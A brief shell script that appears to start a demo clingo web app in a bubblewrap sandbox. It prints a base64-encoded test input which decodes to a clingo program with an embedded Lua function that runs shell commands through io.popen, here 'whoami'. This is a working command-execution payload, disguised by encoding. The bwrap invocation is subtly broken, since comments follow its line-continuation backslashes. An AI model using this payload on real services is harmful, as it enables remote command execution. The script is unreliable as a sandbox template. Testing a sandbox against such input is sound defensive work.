#!/bin/sh

OLD_PWD=`pwd`

cd userarmor_demo
poetry update

echo "***************************"
echo "Try the following program:"
echo
echo -n "I3NjcmlwdChsdWEpCgpmdW5jdGlvbiByY2UoY21kKQogICAgbG9jYWwgZiA9IGFzc2VydChpby5wb3BlbihjbWQuc3RyaW5nLCAncicpKQogICAgbG9jYWwgb3V0cHV0ID0gZjpyZWFkKCcqYScpCiAgICBmOmNsb3NlKCkKICAgIHJldHVybiBvdXRwdXQKZW5kCgojZW5kLgoKb3V0KEByY2UoIndob2FtaSIpKS4gICAg" | base64 -d
echo
echo "***************************"

# Creazione ambiente isolato con bwrap
bwrap \
  --unshare-net \
  --ro-bind /usr /usr \
  --ro-bind /bin /bin \
  --dev /dev \
  --proc /proc \
  --dir /tmp \
  --bind /var/www/clingo_input /input \
  --bind $(pwd) $(pwd) \  # Monta la cartella attuale in modo accessibile
  --bind ~/.cache/pypoetry ~/.cache/pypoetry \  # Monta la cache di poetry
  --bind ~/.local ~/.local \  # Monta la cartella locale (per virtualenv)
  --bind ~/.config/pypoetry ~/.config/pypoetry \  # Configurazione di poetry
  $(command -v poetry) run python app.py --port 5000

cd "$OLD_PWD"
